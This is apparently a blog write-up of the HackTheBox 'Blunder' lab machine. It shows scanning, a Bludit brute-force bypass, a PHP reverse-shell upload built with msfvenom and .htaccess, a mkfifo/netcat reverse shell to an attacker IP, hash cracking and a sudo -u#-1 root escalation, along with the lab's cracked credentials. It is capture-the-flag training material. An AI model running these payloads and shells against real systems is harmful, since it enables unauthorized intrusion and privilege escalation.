---
layout: post
title:  "HackTheBox - Blunder"
date:   2020-11-04 20:40:00 +1100
categories: [CTF, HTB]
tags: [ctf]
---

![Image of info card](/images/htb/blunder/info-card.png)

## Enumeration
---
### Initial Information

Before starting we are shown this this is a linux box and that they rate it as an easy box.

### Editing Hosts
Lets add assign the ip address a domain name in our hosts file.
```
sudo vim /etc/hosts
[ip] blunder.htb
```

### Nmap Scan:
Lets run [nmap](https://nmap.org/) to find information on the machine's ports and services.

```
sudo nmap -A -T4 -Pn -oA nmap-scan -p$(sudo nmap -p- --min-rate=1000 -T4 blunder.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) blunder.htb
```

![Image of nmap scan](/images/htb/blunder/nmap-scan.png)

Nmap shows that there's port 21 (ftp) and 80 (http) open.

### Browsing
Starting with port 80 looks like there's a lot of text to scan through.

![Image of home page](/images/htb//blunder/homepage.png)

Looking through we can see:
* About hint: I created this site to dump my fact files, nothing more.......?
* Powered by EgotisticalSW

### GoBuster

We can use [gobuster](https://github.com/OJ/gobuster) to discover web directories.

```
sudo gobuster dir -u http://blunder.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -s '200,204,301,302,307,403,500' -o gobuster.out -x php,txt -e
```
where:
- **-u** is the target URL
- **-w** is the path to the wordlist
- **-t** is the number of concurrent threads (default 10)
- **-s** is positive status codes (will be overwritten with status-codes-blacklist if set) (default "200,204,301,302,307,401,403")
- **-o** is the output file to write results to (defaults to stdout)
- **-x** is file extension(s) to search for
- **-e** is expanded mode, print full URLs

![Image of gobuster scan](/images/htb/blunder/gobuster.png)

Looking at gogusters results, the `todo.txt` looks the most interesting.

Navigating to http://blunder.htb/todo.txt shows:

![Image of todo text file](/images/htb//blunder/todo.png)

From the to do list, it looks like the CMS hasn't been updated, and a user fergus might exist.

The other interesting find in gobuster is `/admin`

Looking at http://blunder.htb/admin reveals a login page with the name bludit:

![Image of admin page](/images/htb//blunder/admin.png)

Looking up bludit: https://www.bludit.com/ shows that it allows you to create your own website or blog

The admin page we found doesn't reveal what version of bludit it is, however looking at the source code:

![Image of admin source](/images/htb//blunder/admin-source.png)

Shows a number of references to version 3.9.2.

## Exploitation
---
A quick searchsploit for bludit shows some authentication bypass and directory traversal attacks, with two of them being for version 3.9.2, which is the version we suspect the machine is running.

![Image of searchsploit bludit](/images/htb//blunder/searchsploit-bludit.png)

Looking at the `Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass` exploit, `48746.rb`, it seems that we need a username, which we can try fergus from the to do list.  As for the password, i'll be trying the old reliabile rockyou.txt.

We will need to install ther dependencies `httpclient` and `docopt` using `gem install httpclient docopt`

I recieved an error saying `/usr/bin/env: ‘ruby\r’: No such file or directory` which I fixed by running `dos2unix 48746.rb`

With the program working we can now run it.

```
./48746.rb -r http://blunder.htb -u fergus -w /usr/share/wordlists/rockyou.txt
```
where:
- **-r** is the url
- **-u** is the username
- **-w** is the path to a password wordlist

Unfortunatly due to the slow speed at which each password is attempted and the large size of the rockyou wordlist, I eventually decided to stop the scan after a while as I doubted it would work.

Thinking back to the home page of the website, there's a lot of text so perhaps the password is in there, so we can make a wordlist with cewl and try use that for our attack.

```
cewl http://blunder.htb/ -w site_wordlist.txt
```

Running it gives us a list of 349 words, which seems like a much more reasonable size wordlist for an exploit that runs at a slow speed. We can now run at attack again with the new wordlist.

```
./48746.rb -r http://blunder.htb -u fergus -w site_wordlist.txt
```

It successfully finds the password to be `RolandDeschain`, which is on line 176 of our wordlist and the script will stop the brute force attack.

So now we have the credentials for bludit, we can login to the /admin page wirth user: `fergus` and password `RolandDeschain`.

### Bludit Enumeration

Looking around the website things of interest are:
- The notification history on the dashboard
- A draft called Blender under the content section
- An authentication token under profile > security
- Lack of permisisons And it to view the categories and users page from the desktop
- Able to create new content from the desktop

### Bludit Exploitation

Now that we've looked over the website, let's look back at the directory traversal 

Looking back to the directory traversal exploits we found on searchsploit, we have the manual method and a Metasploit module. I'll be trying the manual way.

```
#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png
```

Step 1. Change the variables for url, username and password
```
url = 'http://blunder.htb'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME
```

Step 2. Modify the msfvenom command and generate the payload
```
msfvenom -p php/reverse_php LHOST=10.10.14.52 LPORT=4444 -f raw -b '"' > evil.png
```

Step 3. Add the msfvenom payload inside php code

```
echo -e "<?php $(cat evil.png)" > evil.png
```

Step 4. Create the .htaccess file
```
echo "RewriteEngine off" > .htaccess
echo "AddType application/x-httpd-php .png" >> .htaccess
```

Step 5. Change the exploit extention from .txt to .py
```
cp 48701.txt bludit.py
```

Step 6. Upload the payload using the script
```
python bludit.py
```

Step 7. Start a nc listener
```
nc -nlvp 4444
```

Step 8. Execute the payload by opening the evil.png file in the browser
```
http://blunder.htb/bl-content/tmp/temp/evil.png
```

And we get a reverse shell as user www-data.

## Lateral Movement
---
Looking around we can see 2 users in the /home directory. User hugo and user shaun however only hugo has a user.txt file that only hugo has read access so looks like he will likely be the next target to pivot to.

I kept losing connection so I decided to run another netcat connection.

```
kali: nc nlvp 4445

blunder: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4445 >/tmp/f
```

### linPEAS

We can run [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to do some more information gathering. Curl doesn't seem to be installed to i'll use wget to download linpeas and run it.

kali: 
```
python -m SimpleHTTPServer 80
```

blunder:
```
wget http://10.10.14.12/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

One interesting finding listed is: `/var/www/bludit-3.10.0a/bl-content/databases/users.php:        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d"` which we can look at more closely.

### Bludit stored credentials

Browsing files we find under /var/www 2 versions of bludit, the current version 3.9.2 and version 3.10.0a.

Looking in the folder for the current version of bludit, we can find some password hashes and salts for a user admin and fergus. In the new version, we find a field for admin with the name hugo, which matches the name of a user we want to try to pivot to, as well as the password that was found from linPEAS.

```
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Looks like we now have a hash for hugo's password. With any luck we can find out what it is and that he has reused it for the system.

A quick google search reveals <https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d> with the password being `Password120`

We can now try switch to user hugo and see if Password120 works.
```
su hugo
Password120
```

It works and we can now get the user.txt flag
```
cat /home/hugo/user.txt
```


## Privilege Escalation (to root)
---

Let's first get a better shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

It can be worth running linPEAS again in case it's able to gather more relevent information as the current user. Looking through the results, it appears that sudo is running version 1.8.25p1 which can be verified with `sudo -V`

Lets view sudo permissions
```
sudo -l
User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Looks like sudo is out of date Sudo version 1.8.25p1, let's look up any exploits for sudo using `searchsploit sudo 1.8.`

We see that theres a few different potential exploits. I'll be looking at the .py first since they tend to be more friendly to run with no compiling.

The exploit can also be found online at exploitdb at <https://www.exploit-db.com/exploits/47502>

One thing I was a little confused was the version it mentions in the file, since it says:
- Version : Sudo <1.2.28
- Fix : The bug is fixed in sudo 1.8.28

So since it wasn’t fixed till 1.8.28 then it should work.

Looking at it closely we also see that the root permissions regarding bash matches our situation.

The description for the exploit reads:
> Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

We don't really need to run the python script, we can just use the one line exploit:

```
sudo -u#-1 /bin/bash
```

And success we successfully get root!

Now we just need to get the root flag.

```
cat /root/root.txt
```
